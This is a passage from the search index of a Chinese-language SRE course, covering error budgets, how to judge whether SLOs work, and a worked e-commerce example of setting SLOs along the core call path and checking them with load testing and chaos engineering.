<p>\u4e0e\u7b2c\u4e00\u7c7b\u76f8\u53cd\uff0c\u76ee\u6807\u5b9a\u592a\u9ad8\uff0c\u603b\u662f\u8fbe\u4e0d\u6210\uff08Missed\uff09\uff0c\u4f46\u7528\u6237\u53cd\u9988\u5374\u5f88\u4e0d\u9519\uff08High\uff09\uff0c\u8fd9\u79cd\u5c31\u4f1a\u9020\u6210\u9519\u8bef\u9884\u7b97\u63d0\u524d\u6d88\u8017\u5b8c\uff0c\u5bfc\u81f4\u5f88\u591a\u53d8\u66f4\u6682\u505c\uff0c\u4ea7\u54c1\u5ef6\u671f\uff0c\u751a\u81f3\u4f1a\u505a\u4e00\u4e9b\u65e0\u8c13\u7684\u4f18\u5316\uff0c\u8fd9\u65f6\u5c31\u53ef\u4ee5\u9002\u5f53\u677e\u677e\u7ed1\u3002</p> <p>\u7b2c\u4e09\u7c7b\uff0c\u4fdd\u6301\u73b0\u72b6\uff0c\u5bf9\u6709\u95ee\u9898\u7684\u7ef4\u5ea6\u91c7\u53d6\u6709\u9488\u5bf9\u6027\u7684\u4f18\u5316\u63aa\u65bd\u3002</p> <p>\u6bd4\u5982\u8868\u683c\u7b2c\u4e00\u884c\uff0c\u662f\u6211\u4eec\u671f\u671b\u7684\u6700\u7406\u60f3\u72b6\u6001\uff0cSLO\u80fd\u8fbe\u6210\uff0c\u4eba\u8089\u6295\u5165\u53c8\u4f4e\uff0c\u5ba2\u6237\u6ee1\u610f\u5ea6\u53c8\u5f88\u9ad8\uff0c\u4e5f\u6ca1\u6709\u7279\u522b\u7684\u4f18\u5316\u7a7a\u95f4\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u53ef\u4ee5\u589e\u52a0\u53d1\u5e03\u548c\u53d8\u66f4\u6b21\u6570\uff0c\u66f4\u5927\u7a0b\u5ea6\u5730\u91ca\u653e\u751f\u4ea7\u529b\u3002</p> <p>\u4f60\u53ef\u4ee5\u53c2\u8003\u8fd9\u4e2a\u6837\u4f8b\uff0c\u4eceSLO\u8fbe\u6210\u60c5\u51b5\u3001\u201c\u4eba\u8089\u201d\u6295\u5165\u60c5\u51b5\u4ee5\u53ca\u7528\u6237\u5b9e\u9645\u6ee1\u610f\u5ea6\u4e09\u4e2a\u7ef4\u5ea6\u6765\u8861\u91cf\u81ea\u5df1\u4e1a\u52a1\u548c\u7cfb\u7edf\u7684SLO\u6709\u6548\u6027\uff0c\u8be5\u6536\u7d27SLO\u5c31\u8981\u63d0\u9ad8\u7a33\u5b9a\u6027\u8981\u6c42\uff0c\u4f46\u662f\u4e5f\u4e0d\u80fd\u8bbe\u5b9a\u592a\u8fc7\u8d85\u51fa\u80fd\u529b\u8303\u56f4\u7684\u76ee\u6807\uff0c\u59cb\u7ec8\u8fbe\u4e0d\u6210\uff0cSLO\u4e5f\u5c31\u6ca1\u6709\u610f\u4e49\u4e86\u3002\u5f53\u7136\uff0c\u5728SLO\u53ef\u4ee5\u8fbe\u6210\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u8fd8\u662f\u5e0c\u671b\u63d0\u5347\u6211\u4eec\u7684\u7528\u6237\u4ef7\u503c\u4ea4\u4ed8\u6548\u7387\uff0c\u56f4\u7ed5\u7740\u8fd9\u4e2a\u7ec8\u6781\u76ee\u6807\uff0c\u4e0d\u65ad\u4f18\u5316\u81ea\u5df1\u7684SLO\u548c\u9519\u8bef\u9884\u7b97\u7b56\u7565\u3002</p>"},{"location":"ops/50-sre-mogu-04/#_1","title":"\u603b\u7ed3","text":"<p>\u4eca\u5929\u7684\u5185\u5bb9\u5c31\u8bb2\u89e3\u5b8c\u4e86\uff0c\u6211\u4eec\u91cd\u70b9\u8ba8\u8bba\u4e86\u9519\u8bef\u9884\u7b97\uff0c\u8fd9\u91cc\u6211\u8981\u518d\u5f3a\u8c03\u51e0\u4e2a\u5173\u952e\u70b9\u3002</p> <ul> <li> <p>\u9519\u8bef\u9884\u7b97\u662f\u901a\u8fc7SLO\u63a8\u5bfc\u51fa\u6765\u7684\uff0c\u4e3a\u4e86\u8fbe\u6210SLO\uff0c\u5c31\u8981\u5c3d\u91cf\u51cf\u5c11\u5bf9\u5b83\u7684\u6d88\u8017\u3002</p> </li> <li> <p>\u9519\u8bef\u9884\u7b97\u7684\u8b66\u793a\u6548\u679c\u66f4\u663e\u8457\uff0c\u6240\u4ee5\u6211\u4eec\u901a\u5e38\u4f1a\u56f4\u7ed5\u5b83\u6765\u5f00\u5c55\u7a33\u5b9a\u6027\u4fdd\u969c\u5de5\u4f5c\u3002\u843d\u5730\u9519\u8bef\u9884\u7b97\u53ef\u4ee5\u9075\u5faa\u4e00\u4e9b\u57fa\u672c\u539f\u5219\uff0c\u6bd4\u5982\u8981\u5bf9\u7cfb\u7edf\u6545\u969c\u6216\u95ee\u9898\u6709\u5bb9\u5fcd\u5ea6\uff0c\u5728\u9884\u7b97\u6d88\u8017\u8fc7\u5feb\u6216\u6d88\u8017\u6b86\u5c3d\u4e4b\u524d\uff0cSRE\u6709\u6743\u8e29\u8e29\u201c\u5239\u8f66\u201d\uff0c\u51cf\u5c11\u6216\u62d2\u7edd\u7ebf\u4e0a\u53d8\u66f4\u7b49\u7b49\uff0c\u8fd9\u4e9b\u7b56\u7565\u8981\u81ea\u4e0a\u800c\u4e0b\u8fbe\u6210\u5171\u8bc6\u3002</p> </li> <li> <p>SLO\u548c\u9519\u8bef\u9884\u7b97\u662f\u5426\u5408\u7406\uff0c\u57fa\u4e8e\u5b83\u4eec\u7684\u7b56\u7565\u662f\u5426\u6709\u6548\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7SLO\u8fbe\u6210\u60c5\u51b5\u3001\u4eba\u8089\u6295\u5165\u7a0b\u5ea6\u548c\u7528\u6237\u6ee1\u610f\u5ea6\u4e09\u4e2a\u7ef4\u5ea6\u8fdb\u884c\u8bc4\u4f30\uff0c\u8fdb\u800c\u8c03\u6574\u548c\u4f18\u5316\u5b83\u4eec\u3002</p> </li> </ul>"},{"location":"ops/50-sre-mogu-05/","title":"05 | \u6848\u4f8b\uff1a\u843d\u5730SLO\u65f6\u8fd8\u9700\u8981\u8003\u8651\u54ea\u4e9b\u56e0\u7d20\uff1f","text":"<p>\u524d\u9762\u51e0\u8282\u8bfe\uff0c\u6211\u4eec\u6309\u7167\u5c42\u5c42\u9012\u8fdb\u7684\u601d\u8def\uff0c\u4ece\u53ef\u7528\u6027\u8bb2\u5230SLI\u548cSLO\uff0c\u518d\u5230SLO\u6240\u5bf9\u5e94\u7684Error Budget\u7b56\u7565\u3002\u638c\u63e1\u4e86\u8fd9\u4e9b\u5185\u5bb9\uff0c\u4e5f\u5c31\u4e3a\u6211\u4eec\u5efa\u8bbeSRE\u4f53\u7cfb\u6253\u4e0b\u4e86\u4e00\u4e2a\u7a33\u56fa\u7684\u57fa\u7840\u3002</p> <p>\u4eca\u5929\uff0c\u6211\u7528\u4e00\u4e2a\u7535\u5546\u7cfb\u7edf\u7684\u6848\u4f8b\uff0c\u5e26\u7740\u4f60\u4ece\u5934\u5f00\u59cb\uff0c\u4e00\u6b65\u4e00\u6b65\u7cfb\u7edf\u6027\u5730\u8bbe\u5b9aSLO\uff0c\u4e00\u65b9\u9762\u5de9\u56fa\u6211\u4eec\u524d\u9762\u6240\u5b66\u7684\u5185\u5bb9\uff0c\u53e6\u4e00\u65b9\u9762\u7ee7\u7eed\u548c\u4f60\u5206\u4eab\u4e00\u4e9b\u6211\u5728\u5b9e\u8df5\u4e2d\u603b\u7ed3\u7684\u6ce8\u610f\u4e8b\u9879\u3002</p>"},{"location":"ops/50-sre-mogu-05/#_1","title":"\u6848\u4f8b\u80cc\u666f","text":"<p>\u6211\u5148\u6765\u7ed9\u4f60\u4ecb\u7ecd\u4e0b\u7535\u5546\u7cfb\u7edf\u6848\u4f8b\u7684\u57fa\u7840\u60c5\u51b5\uff0c\u6846\u5b9a\u4e0b\u6211\u4eec\u4eca\u5929\u8981\u8ba8\u8bba\u7684\u5185\u5bb9\u8303\u56f4\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u7535\u5546\u7cfb\u7edf\u4e00\u5b9a\u6709\u4e00\u4e2a\u6216\u51e0\u4e2a\u6838\u5fc3\u670d\u52a1\uff0c\u6bd4\u5982\u8981\u7ed9\u7528\u6237\u63d0\u4f9b\u5546\u54c1\u9009\u62e9\u3001\u641c\u7d22\u548c\u8d2d\u4e70\u7684\u670d\u52a1\u7b49\u3002\u4f46\u6211\u4eec\u77e5\u9053\uff0c\u5927\u90e8\u5206\u7528\u6237\u5e76\u4e0d\u662f\u4e0a\u6765\u5c31\u8d2d\u4e70\uff0c\u800c\u662f\u4f1a\u6709\u4e00\u4e2a\u8bbf\u95ee\u7684\u8fc7\u7a0b\uff0c\u4ed6\u4eec\u4f1a\u5148\u767b\u5f55\uff0c\u518d\u641c\u7d22\uff0c\u7136\u540e\u8bbf\u95ee\u4e00\u4e2a\u6216\u591a\u4e2a\u5546\u54c1\u8be6\u60c5\u4ecb\u7ecd\uff0c\u51b3\u5b9a\u662f\u653e\u5230\u8d2d\u7269\u8f66\u5019\u9009\uff0c\u8fd8\u662f\u9009\u62e9\u7269\u6d41\u5730\u5740\u540e\u76f4\u63a5\u4e0b\u5355\uff0c\u6700\u540e\u652f\u4ed8\u8d2d\u4e70\u3002</p> <p>\u8fd9\u6761\u4ece\u767b\u5f55\u5230\u8d2d\u4e70\u7684\u94fe\u8def\uff0c\u6211\u4eec\u4e00\u822c\u79f0\u4e4b\u4e3a\u7cfb\u7edf\u7684**\u6838\u5fc3\u94fe\u8def**\uff08Critical Path\uff09\uff0c\u7cfb\u7edf\u6216\u7f51\u7ad9\u5c31\u662f\u4f9d\u9760\u8fd9\u6837\u4e00\u6761\u8bbf\u95ee\u94fe\u8def\uff0c\u4e3a\u7528\u6237\u63d0\u4f9b\u4e86\u8d2d\u4e70\u5546\u54c1\u7684\u670d\u52a1\u80fd\u529b\u3002</p> <p>\u81f3\u4e8e\u7535\u5546\u7cfb\u7edf\u7684\u5176\u5b83\u9875\u9762\u6216\u80fd\u529b\uff0c\u6bd4\u5982\u7f51\u7ad9\u653f\u7b56\u3001\u65b0\u624b\u6307\u5bfc\u3001\u5f00\u5e97\u6307\u5357\u7b49\u7b49\uff0c\u8fd9\u4e9b\u5bf9\u7528\u6237\u8d2d\u4e70\u670d\u52a1\u4e0d\u4f1a\u9020\u6210\u592a\u5927\u5f71\u54cd\u7684\uff0c\u76f8\u5bf9\u4e8e\u6838\u5fc3\u94fe\u8def\u6765\u8bf4\uff0c\u5b83\u7684\u91cd\u8981\u6027\u5c31\u76f8\u5bf9\u4f4e\u4e00\u4e9b\u3002</p> <p>\u6211\u4eec\u8981\u7ed9\u7535\u5546\u7cfb\u7edf\u8bbe\u5b9aSLO\uff0c\u5927\u7684\u539f\u5219\u5c31\u662f**\u5148\u8bbe\u5b9a\u6838\u5fc3\u94fe\u8def\u7684SLO\uff0c\u7136\u540e\u6839\u636e\u6838\u5fc3\u94fe\u8def\u8fdb\u884cSLO\u7684\u5206\u89e3**\u3002\u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c31\u4e00\u6b65\u6b65\u62c6\u89e3\u52a8\u4f5c\uff0c\u770b\u770b\u600e\u4e48\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u6807\u3002</p>"},{"location":"ops/50-sre-mogu-05/#_2","title":"\u6838\u5fc3\u94fe\u8def\uff1a\u786e\u5b9a\u6838\u5fc3\u5e94\u7528\u4e0e\u5f3a\u5f31\u4f9d\u8d56\u5173\u7cfb","text":"<p>\u8981\u786e\u5b9a\u6838\u5fc3\u94fe\u8def\u7684SLO\uff0c\u6211\u4eec\u5f97\u5148\u627e\u5230\u6838\u5fc3\u94fe\u8def\u3002\u600e\u4e48\u5b9e\u73b0\u5462\uff1f</p> <p>\u6211\u4eec\u53ef\u4ee5\u5148\u901a\u8fc7\u5168\u94fe\u8def\u8ddf\u8e2a\u8fd9\u6837\u7684\u6280\u672f\u624b\u6bb5\u627e\u51fa\u6240\u6709\u76f8\u5173\u5e94\u7528\uff0c\u4e5f\u5c31\u662f\u5448\u73b0\u51fa\u8c03\u7528\u5173\u7cfb\u7684\u62d3\u6251\u56fe\uff0c\u4e0b\u9762\u6211\u7ed9\u4e86\u4e00\u5f20\u56fe\uff0c\u8fd9\u4e2a\u56fe\u4f60\u5e94\u8be5\u5e76\u4e0d\u964c\u751f\uff0c\u8fd9\u662f\u4e9a\u9a6c\u900a\u7535\u5546\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u771f\u5b9e\u8c03\u7528\u5173\u7cfb\u62d3\u6251\u56fe\u3002\u4e4b\u6240\u4ee5\u8fd9\u4e48\u590d\u6742\uff0c\u662f\u56e0\u4e3a\u5373\u4f7f\u662f\u5355\u6761\u8def\u5f84\uff0c\u5b83\u5b9e\u9645\u8986\u76d6\u7684\u5e94\u7528\u4e5f\u662f\u5f88\u591a\u7684\uff0c\u7279\u522b\u662f\u5bf9\u4e8e\u5927\u578b\u7684\u5206\u5e03\u5f0f\u4e1a\u52a1\u7cfb\u7edf\uff0c\u53ef\u80fd\u4f1a\u6709\u51e0\u5341\u751a\u81f3\u4e0a\u767e\u4e2a\u8def\u5f84\uff0c\u8fd9\u4e9b\u5e94\u7528\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\u4e5f\u7279\u522b\u590d\u6742\u3002</p> <p></p> <p>\u9762\u5bf9\u8fd9\u6837\u590d\u6742\u7684\u5e94\u7528\u5173\u7cfb\uff0c\u662f\u4e0d\u662f\u611f\u89c9\u65e0\u4ece\u4e0b\u624b\uff1f\u90a3\u5c31\u7ee7\u7eed\u6765\u505a\u7cbe\u7b80\uff0c\u4e5f\u5c31\u662f**\u533a\u5206\u54ea\u4e9b\u662f\u6838\u5fc3\u5e94\u7528\uff0c\u54ea\u4e9b\u662f\u975e\u6838\u5fc3\u5e94\u7528**\u3002\u8fd9\u662f\u8981\u6839\u636e\u4e1a\u52a1\u573a\u666f\u548c\u7279\u70b9\u6765\u51b3\u5b9a\u7684\uff0c\u57fa\u672c\u4e0a\u9700\u8981\u5bf9\u6bcf\u4e2a\u5e94\u7528\u9010\u4e2a\u8fdb\u884c\u5206\u6790\u548c\u8ba8\u8bba\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u53ef\u80fd\u8981\u6295\u5165\u5927\u91cf\u7684\u4eba\u5de5\u6765\u624d\u80fd\u5b8c\u6210\uff0c\u4f46\u8fd9\u4e2a\u662f\u57fa\u7840\uff0c\u867d\u7136\u7e41\u7410\u4e14\u8d39\u65f6\u8d39\u529b\uff0c\u4e5f\u4e00\u5b9a\u8981\u505a\u3002</p> <p>\u8fd9\u91cc\u6211\u7b80\u5355\u4e3e\u4e2a\u4f8b\u5b50\u8bf4\u660e\u3002</p> <p>\u6bd4\u5982\u7528\u6237\u8bbf\u95ee\u5546\u54c1\u8be6\u60c5\u7684\u65f6\u5019\uff0c\u4f1a\u540c\u65f6\u5c55\u73b0\u5546\u54c1\u8bc4\u4ef7\u4fe1\u606f\uff0c\u4f46\u662f\u8fd9\u4e9b\u4fe1\u606f\u4e0d\u5c55\u73b0\uff0c\u5bf9\u4e8e\u7528\u6237\u9009\u62e9\u5546\u54c1\u4e5f\u4e0d\u4f1a\u9020\u6210\u975e\u5e38\u5927\u5f71\u54cd\uff0c\u7279\u522b\u662f\u5728\u53cc\u5341\u4e00\u5927\u4fc3\u8fd9\u6837\u7684\u573a\u666f\u4e2d\uff0c\u7528\u6237\u5728\u8fd9\u4e2a\u65f6\u523b\u7684\u76ee\u7684\u5f88\u660e\u786e\uff0c\u5c31\u662f\u8d2d\u4e70\u5546\u54c1\uff0c\u5e76\u4e0d\u662f\u770b\u8bc4\u4ef7\u3002\u6240\u4ee5\u7c7b\u4f3c\u5546\u54c1\u8bc4\u4ef7\u7684\u5e94\u7528\u662f\u53ef\u4ee5\u964d\u7ea7\u7684\uff0c\u6216\u8005\u77ed\u65f6\u95f4\u4e0d\u63d0\u4f9b\u670d\u52a1\u3002\u90a3\u8fd9\u79cd\u4e0d\u5f71\u54cd\u6838\u5fc3\u4e1a\u52a1\u7684\u5e94\u7528\u5c31\u53ef\u4ee5\u5f52\u4e3a\u975e\u6838\u5fc3\u5e94\u7528\u3002</p> <p>\u76f8\u53cd\u7684\uff0c\u50cf\u5546\u54c1SKU\u6216\u4f18\u60e0\u5238\u8fd9\u6837\u7684\u5e94\u7528\uff0c\u76f4\u63a5\u51b3\u5b9a\u4e86\u7528\u6237\u6700\u7ec8\u7684\u8d2d\u4e70\u91d1\u989d\uff0c\u8fd9\u79cd\u5e94\u7528\u5728\u4efb\u4f55\u65f6\u523b\u90fd\u8981\u4fdd\u6301\u9ad8\u53ef\u7528\u3002\u90a3\u8fd9\u79cd\u5fc5\u987b\u662f\u9ad8\u53ef\u7528\u7684\u5e94\u7528\u5c31\u662f\u6838\u5fc3\u5e94\u7528\u3002</p> <p>\u5c31\u8fd9\u6837\uff0c\u6211\u4eec\u9700\u8981\u6295\u5165\u4e00\u4e9b\u7cbe\u529b\u4e00\u4e00\u6765\u770b\uff0c\u786e\u5b9a\u54ea\u4e9b\u662f\u6838\u5fc3\u5e94\u7528\uff0c\u54ea\u4e9b\u662f\u975e\u6838\u5fc3\u5e94\u7528\u3002\u68b3\u7406\u5b8c\u6210\u540e\uff0c\u9488\u5bf9\u7535\u5546\u7cfb\u7edf\uff0c\u6211\u4eec\u5927\u6982\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u7c7b\u4f3c\u4e0b\u56fe\u7684\u7b80\u5316\u62d3\u6251\u5173\u7cfb\uff08\u5f53\u7136\u4e86\uff0c\u8fd9\u91cc\u4ecd\u7136\u662f\u793a\u4f8b\uff0c\u76f8\u5bf9\u7b80\u5316\uff0c\u4e3b\u8981\u662f\u4fdd\u8bc1\u6548\u679c\u4e0a\u4e00\u76ee\u4e86\u7136\uff09\u3002</p> <p></p> <p>\u8fd9\u5f20\u56fe\u5c31\u5448\u73b0\u51fa\u4e00\u6761\u5178\u578b\u7684\u7535\u5546\u4ea4\u6613\u7684\u5173\u952e\u8def\u5f84\uff0c\u5176\u4e2d\u7eff\u8272\u90e8\u5206\u4e3a\u6838\u5fc3\u5e94\u7528\uff0c\u84dd\u8272\u90e8\u5206\u4e3a\u975e\u6838\u5fc3\u5e94\u7528\u3002</p> <p>\u8fd9\u4e2a\u65f6\u5019\uff0c\u6211\u4eec\u53c8\u8981\u8fdb\u884c\u5173\u952e\u7684\u4e00\u6b65\u4e86\uff0c\u5c31\u662f\u786e\u8ba4\u5f3a\u5f31\u4f9d\u8d56\u3002</p> <p>\u6838\u5fc3\u5e94\u7528\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u5f3a\u4f9d\u8d56\uff0c\u800c\u5176\u5b83\u5e94\u7528\u4e4b\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u6211\u4eec\u79f0\u4e4b\u4e3a\u5f31\u4f9d\u8d56\uff0c\u8fd9\u91cc\u5c31\u5305\u542b\u4e24\u79cd\u5173\u7cfb\uff0c\u4e00\u79cd\u662f\u6838\u5fc3\u5e94\u7528\u4e0e\u975e\u6838\u5fc3\u5e94\u7528\u4e4b\u95f4\u7684\u4f9d\u8d56\uff0c\u53e6\u4e00\u79cd\u662f\u975e\u6838\u5fc3\u5e94\u7528\u4e4b\u95f4\u7684\u4f9d\u8d56\u3002</p> <p>\u597d\u4e86\uff0c\u81f3\u6b64\uff0c\u6211\u4eec\u5c31\u786e\u5b9a\u4e86\u8fd9\u4e2a\u7535\u5546\u7cfb\u7edf\u7684\u6838\u5fc3\u5e94\u7528\u548c\u5f3a\u5f31\u4f9d\u8d56\u5173\u7cfb\uff0c\u4e5f\u5c31\u662f\u627e\u5230\u4e86\u8fd9\u4e2a\u7cfb\u7edf\u7684\u6838\u5fc3\u94fe\u8def\u3002\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbe\u5b9a\u8fd9\u6761\u6838\u5fc3\u94fe\u8def\u7684SLO\u4e86\uff0c\u5e76\u57fa\u4e8e\u6b64\u8bbe\u5b9a\u5176\u4ed6\u7684SLO\u3002\u8fd9\u65f6\u5e94\u8be5\u9075\u5faa\u54ea\u4e9b\u539f\u5219\u5462\uff1f</p>"},{"location":"ops/50-sre-mogu-05/#slo","title":"\u8bbe\u5b9aSLO\u6709\u54ea\u4e9b\u539f\u5219\uff1f","text":"<p>\u9488\u5bf9\u6838\u5fc3\u548c\u975e\u6838\u5fc3\u5e94\u7528\uff0c\u4ee5\u53ca\u5f3a\u5f31\u4f9d\u8d56\u5173\u7cfb\uff0c\u6211\u4eec\u5728\u8bbe\u5b9aSLO\u65f6\u7684\u8981\u6c42\u4e5f\u662f\u4e0d\u540c\u7684\uff0c\u5177\u4f53\u6765\u8bf4\uff0c\u53ef\u4ee5\u91c7\u53d6\u4e0b\u97624\u4e2a\u539f\u5219\u3002</p> <p>\u7b2c\u4e00\uff0c\u6838\u5fc3\u5e94\u7528\u7684SLO\u8981\u66f4\u4e25\u683c\uff0c\u975e\u6838\u5fc3\u5e94\u7528\u53ef\u4ee5\u653e\u5bbd\u3002 \u8fd9\u4e48\u505a\uff0c\u5c31\u662f\u4e3a\u4e86\u786e\u4fddSRE\u7684\u7cbe\u529b\u80fd\u591f\u66f4\u591a\u5730\u5173\u6ce8\u5728\u6838\u5fc3\u4e1a\u52a1\u4e0a\u3002</p> <p>\u7b2c\u4e8c\uff0c\u5f3a\u4f9d\u8d56\u4e4b\u95f4\u7684\u6838\u5fc3\u5e94\u7528\uff0cSLO\u8981\u4e00\u81f4\u3002 \u6bd4\u5982\u4e0b\u5355\u7684Buy\u5e94\u7528\u8981\u4f9d\u8d56Coupon\u8fd9\u4e2a\u4fc3\u9500\u5e94\u7528\uff0c\u6211\u4eec\u8981\u6c42\u4e0b\u5355\u6210\u529f\u7387\u7684SLO\u898199.95%\uff0c\u5982\u679cCoupon\u53ea\u670999.9%\uff0c\u90a3\u5f88\u663e\u7136\uff0c\u4e0b\u5355\u6210\u529f\u7387\u662f\u8fbe\u4e0d\u6210\u76ee\u6807\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u5c31\u4f1a\u8981\u6c42Coupon\u7684\u6210\u529f\u7387SLO\u4e5f\u8981\u8fbe\u523099.95% \u3002</p> <p>\u7b2c\u4e09\uff0c\u5f31\u4f9d\u8d56\u4e2d\uff0c\u6838\u5fc3\u5e94\u7528\u5bf9\u975e\u6838\u5fc3\u7684\u4f9d\u8d56\uff0c\u8981\u6709\u964d\u7ea7\u3001\u7194\u65ad\u548c\u9650\u6d41\u7b49\u670d\u52a1\u6cbb\u7406\u624b\u6bb5\u3002 \u8fd9\u6837\u505a\u662f\u4e3a\u4e86\u907f\u514d\u7531\u975e\u6838\u5fc3\u5e94\u7528\u7684\u5f02\u5e38\u800c\u5bfc\u81f4\u6838\u5fc3\u5e94\u7528SLO\u4e0d\u8fbe\u6807\u3002</p> <p>\u7b2c\u56db\uff0cError Budget\u7b56\u7565\uff0c\u6838\u5fc3\u5e94\u7528\u7684\u9519\u8bef\u9884\u7b97\u8981\u5171\u4eab\uff0c\u5c31\u662f\u5982\u679c\u67d0\u4e2a\u6838\u5fc3\u5e94\u7528\u9519\u8bef\u9884\u7b97\u6d88\u8017\u5b8c\uff0cSLO\u6ca1\u6709\u8fbe\u6210\uff0c\u90a3\u6574\u6761\u94fe\u8def\uff0c\u539f\u5219\u4e0a\u662f\u8981\u5168\u90e8\u6682\u505c\u64cd\u4f5c\u7684\uff0c\u56e0\u4e3a\u5bf9\u4e8e\u7528\u6237\u6765\u8bf4\uff0c\u4ed6\u4e0d\u4f1a\u5224\u65ad\u662f\u56e0\u4e3a\u54ea\u4e2a\u5e94\u7528\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u7684\u4f53\u9a8c\u6216\u611f\u53d7\u4e0d\u597d\u3002\u6240\u4ee5\uff0c\u5355\u4e2a\u5e94\u7528\u7684\u9519\u8bef\u9884\u7b97\u6d88\u8017\u5b8c\uff0c\u90fd\u8981\u505c\u6b62\u53d8\u66f4\uff0c\u7b49\u95ee\u9898\u5b8c\u5168\u89e3\u51b3\u518d\u6062\u590d\u53d8\u66f4\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u9002\u5f53\u5bbd\u677e\uff0c\u5982\u679c\u67d0\u4e2a\u6838\u5fc3\u5e94\u7528\u81ea\u8eab\u9884\u7b97\u5145\u8db3\uff0c\u4e14\u53d8\u66f4\u4e0d\u5f71\u54cd\u6838\u5fc3\u94fe\u8def\u529f\u80fd\uff0c\u4e5f\u53ef\u4ee5\u6309\u7167\u81ea\u5df1\u7684\u8282\u594f\u7ee7\u7eed\u505a\u53d8\u66f4\u3002\u8fd9\u4e00\u70b9\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u4e1a\u52a1\u60c5\u51b5\u81ea\u884c\u5224\u65ad\u3002</p>"},{"location":"ops/50-sre-mogu-05/#slo_1","title":"\u5982\u4f55\u9a8c\u8bc1\u6838\u5fc3\u94fe\u8def\u7684SLO\uff1f","text":"<p>\u68b3\u7406\u51fa\u7cfb\u7edf\u7684\u6838\u5fc3\u94fe\u8def\u5e76\u8bbe\u5b9a\u597dSLO\u540e\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e9b\u624b\u6bb5\u6765\u8fdb\u884c\u9a8c\u8bc1\u3002\u8fd9\u91cc\uff0c\u6211\u7ed9\u4f60\u4ecb\u7ecd\u4e24\u79cd\u624b\u6bb5\uff0c\u4e00\u79cd\u662f\u5bb9\u91cf\u538b\u6d4b\uff0c\u53e6\u4e00\u79cd\u5c31\u662fChaos Engineering\uff0c\u4e5f\u5c31\u662f\u6df7\u6c8c\u5de5\u7a0b\u3002</p> <p>\u5bb9\u91cf\u538b\u6d4b</p> <p>\u6211\u4eec\u5148\u6765\u770b\u5bb9\u91cf\u538b\u6d4b\u3002\u5bb9\u91cf\u538b\u6d4b\u7684\u4e3b\u8981\u4f5c\u7528\uff0c\u5c31\u662f\u770bSLO\u4e2d\u7684Volume\uff0c\u4e5f\u5c31\u662f\u5bb9\u91cf\u76ee\u6807\u662f\u5426\u53ef\u4ee5\u8fbe\u6210\u3002\u5bf9\u4e8e\u4e00\u822c\u7684\u4e1a\u52a1\u7cfb\u7edf\uff0c\u6211\u4eec\u90fd\u4f1a\u7528QPS\u548cTPS\u6765\u8868\u793a\u7cfb\u7edf\u5bb9\u91cf\uff0c\u5f97\u5230\u4e86\u5bb9\u91cf\u8fd9\u4e2a\u6307\u6807\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728\u5e73\u65f6\u89c2\u5bdf\u5e94\u7528\u6216\u7cfb\u7edf\u8fd0\u884c\u7684\u5bb9\u91cf\u6c34\u4f4d\u60c5\u51b5\u3002\u6bd4\u5982\uff0c\u6211\u4eec\u8bbe\u5b9a\u5bb9\u91cf\u7684SLO\u662f5000 QPS\uff0c\u5982\u679c\u65e5\u5e38\u8fbe\u52304500\uff0c\u4e5f\u5c31\u662fSLO\u768490%\uff0c\u6211\u4eec\u8ba4\u4e3a\u8fd9\u4e2a\u6c34\u4f4d\u72b6\u6001\u4e0b\uff0c\u5c31\u8981\u542f\u52a8\u6269\u5bb9\uff0c\u63d0\u524d\u5e94\u5bf9\u66f4\u5927\u7684\u8bbf\u95ee\u6d41\u91cf\u3002</p> <p>\u5bb9\u91cf\u538b\u6d4b\u7684\u53e6\u4e00\u4e2a\u4f5c\u7528\uff0c\u5c31\u662f\u770b\u5728\u6781\u7aef\u7684\u5bb9\u91cf\u573a\u666f\u4e0b\uff0c\u9a8c\u8bc1\u6211\u4eec\u524d\u9762\u8bf4\u5230\u7684\u9650\u6d41\u964d\u7ea7\u7b56\u7565\u662f\u5426\u53ef\u4ee5\u751f\u6548\u3002</p> <p>\u6211\u4eec\u770b\u4e0a\u9762\u7535\u5546\u4ea4\u6613\u7684\u5173\u952e\u8def\u5f84\u56fe\uff0c\u4ee5Detail\uff08\u5546\u54c1\u8be6\u60c5\u9875\uff09\u548cComment\uff08\u5546\u54c1\u8bc4\u8bba\uff09\u8fd9\u4e24\u4e2a\u5e94\u7528\u4e4b\u95f4\u7684\u5f31\u4f9d\u8d56\u5173\u7cfb\u4e3a\u4f8b\u3002\u4ece\u5f31\u4f9d\u8d56\u7684\u539f\u5219\u4e0a\u8bb2\uff0c\u5982\u679cComment\u51fa\u73b0\u88ab\u8c03\u7528\u6b21\u6570\u8fc7\u591a\u8d85\u65f6\u6216\u5931\u8d25\uff0c\u662f\u4e0d\u80fd\u5f71\u54cdDetail\u8fd9\u4e2a\u6838\u5fc3\u5e94\u7528\u7684\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u8981\u770b\u8fd9\u4e24\u4e2a\u5e94\u7528\u4e4b\u95f4\u5bf9\u5e94\u7684\u964d\u7ea7\u7b56\u7565\u662f\u5426\u751f\u6548\uff0c\u5982\u679c\u751f\u6548\u4e1a\u52a1\u6d41\u7a0b\u662f\u4e0d\u4f1a\u963b\u585e\u7684\uff0c\u5982\u679c\u6ca1\u6709\u751f\u6548\uff0c\u90a3\u8fd9\u6761\u94fe\u8def\u7684\u6210\u529f\u7387\u5c31\u4f1a\u9a6c\u4e0a\u964d\u4e0b\u6765\u3002</p> 